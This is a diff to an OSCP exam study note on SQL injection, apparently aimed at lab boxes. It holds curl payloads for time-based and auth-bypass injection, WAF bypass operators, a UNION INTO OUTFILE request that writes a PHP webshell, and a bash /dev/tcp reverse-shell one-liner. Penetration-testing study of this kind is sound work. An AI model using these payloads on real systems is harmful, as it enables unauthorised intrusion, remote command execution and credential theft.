@@ -8,6 +8,7 @@
 
 Test for injection with a time-based probe (safe — no data returned, just a delay):
 
+> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
 ```bash
 # Time-based blind — target sleeps 5s if injectable
 curl -s -o /dev/null -w "%{time_total}" \
@@ -23,6 +24,7 @@ curl -s -X POST http://$BoxIP/login.php \
 
 If injection is confirmed, escalate to INTO OUTFILE:
 
+> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
 ```bash
 # Write a PHP webshell to the web root (MySQL must have FILE privilege)
 curl -s "http://$BoxIP/index.php?id=1 UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>',2,3 INTO OUTFILE '/var/www/html/cmd.php'-- -"
@@ -60,11 +62,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ## What did you get?
 
-- [ ] Time delay or SQL error confirms injection → **Go to HackTricks SQLi or use sqlmap (not in OSCP exam) to enumerate columns and databases**
+- [ ] Time delay or SQL error confirms injection → **Go to the SQLi module's UNION steps, run the column-count and database-name requests there, then return to this page**
 - [ ] Auth bypass succeeds → **You are authenticated — enumerate the application for further attack surface**
-- [ ] INTO OUTFILE writes the webshell → **Use `cmd.php?cmd=id` to confirm, then send a reverse shell and go to Step 12 · [[Linux - Shell Stabilise]]**
+- [ ] INTO OUTFILE writes the webshell → **Run `curl -s 'http://$BoxIP/$UploadPath/cmd.php?cmd=id'`, confirm `uid=`, then send the documented reverse shell and go to Step 12 · [[Linux - Shell Stabilise]]**
 - [ ] INTO OUTFILE is denied → **MySQL lacks FILE privilege — extract credentials from the database instead**
-- [ ] Credentials are extracted → **Validate them on SSH or the application**
+- [ ] Credentials are extracted → **Run `ssh $Username@$BoxIP` with `$Password`, or submit the values to the application once, then record the result**
 - [ ] No injection found → **Go to Step 5 · [[Linux - Web Enum]] and look for other parameters**
 
 ## Notes
@@ -73,7 +75,7 @@ INTO OUTFILE requires the MySQL user to have the `FILE` privilege and the web ro
 
 For reverse shell from a webshell: `cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LocalIP/$Lport+0>%261'` or URL-encode a full payload from RevShells.
 
-No `sqlmap` in the OSCP exam. Learn the manual column-count and UNION-based extraction steps from HackTricks.
+The OSCP workflow requires manual SQLi. Learn the column-count and UNION-based extraction steps from HackTricks rather than relying on an automated scanner.
 
 ## Gotcha
 
@@ -83,6 +85,23 @@ No `sqlmap` in the OSCP exam. Learn the manual column-count and UNION-based extr
 > [!warning] 💡
 > INTO OUTFILE will silently fail if the file already exists or the directory is not writable. Try `/var/www/html/`, `/var/www/`, and `/srv/http/` if the first path fails.
 
+## WAF keyword bypasses
+
+If a web application firewall (WAF) blocks obvious SQL keywords, vary the boolean operator while keeping the surrounding SQL syntax valid. In MySQL, `||` can mean OR and `&&` can mean AND when SQL mode permits it; comment syntax also varies by database.
+
+> **Why:** These requests test equivalent boolean conditions with alternate operators and comments; look for the same response difference as the original true/false probe.
+```bash
+# Compare each response with the normal login or query response.
+curl -s -X POST "$URL" --data-urlencode "username=' || 1=1#" -d "password=x"
+curl -s -X POST "$URL" --data-urlencode "username=' && 1=1#" -d "password=x"
+curl -s "$URL?id=1' OR 1=1--+"
+```
+
+## Additional routing
+
+- [ ] An alternate operator changes the response or logs you in → **Characterise the injection manually, then continue with the existing SQLi extraction path**
+- [ ] Every operator is blocked or responses are identical → **Treat that parameter as a dead end and return to Step 5 · [[Linux - Web Enum]]**
+
 ## External Resources
 
 | Resource | Link |
@@ -90,3 +109,15 @@ No `sqlmap` in the OSCP exam. Learn the manual column-count and UNION-based extr
 | HackTricks — SQLi | https://book.hacktricks.xyz/pentesting-web/sql-injection |
 | PayloadsAllTheThings — SQLi | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection |
 | RevShells | https://www.revshells.com |
+## Seen in
+- [[OSCP/BOXES/WRITE UPS/Linux/6. Pebbles|Pebbles]] -- confirmed in the box write-up
+- [[OSCP/BOXES/WRITE UPS/Linux/10. Cockpit|Cockpit]] -- confirmed in the box write-up
+
+## Related stages
+
+- [[Linux - Service Scan]]
+- [[Linux - Web Enum]]
+- [[Linux - Exploit Search]]
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
